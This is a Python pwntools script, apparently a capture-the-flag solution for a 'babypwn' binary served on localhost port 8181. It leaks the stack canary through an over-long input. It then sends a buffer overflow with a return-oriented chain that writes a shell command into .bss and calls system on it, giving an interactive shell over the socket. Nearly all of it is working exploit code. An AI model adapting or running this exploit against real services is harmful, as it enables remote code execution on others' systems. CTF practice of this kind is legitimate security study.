from pwn import *
import time
print("---------------------")
print("-------BABYPWN-------")
print("---pwned by pwnWiz---")
print("---------------------")
print("\n")

plt_recv=0x080486E0
plt_system=0x08048620
bss_addr=0x0804b1b4
ppppr_addr=0x08048eec
cmd="/bin/sh >&4 <&4 2>&4"


r = remote("localhost", 8181)
r.recvuntil('menu >')
r.send('1\n')
r.recvuntil(":")
r.recv(1024)

r.send("A"*41)
dump= r.recv(1024)
print hexdump(dump)
canary=u32("\x00"+dump[41:44])
print("\n")
log.info("I Found Canary!! : 0x%x" %canary)


print r.recvuntil('menu >')
print("1\n")

r.send('1\n')
r.recvuntil(":")

payload="A"*40
payload+=p32(canary)
payload+="A"*12
payload+=p32(plt_recv)
payload+=p32(ppppr_addr)
payload+=p32(4)
payload+=p32(bss_addr)
payload+=p32(len(cmd))
payload+=p32(0)
payload+=p32(plt_system)
payload+="A"*4
payload+=p32(bss_addr)

r.send(payload+"\n")
print("\n")
log.info("Payload Injected!!")
print("\n")
print r.recvuntil('menu >')
print("3\n")
r.send('3\n')
r.send(cmd)
log.info("pwned by pwnWiz :<")
r.interactive()

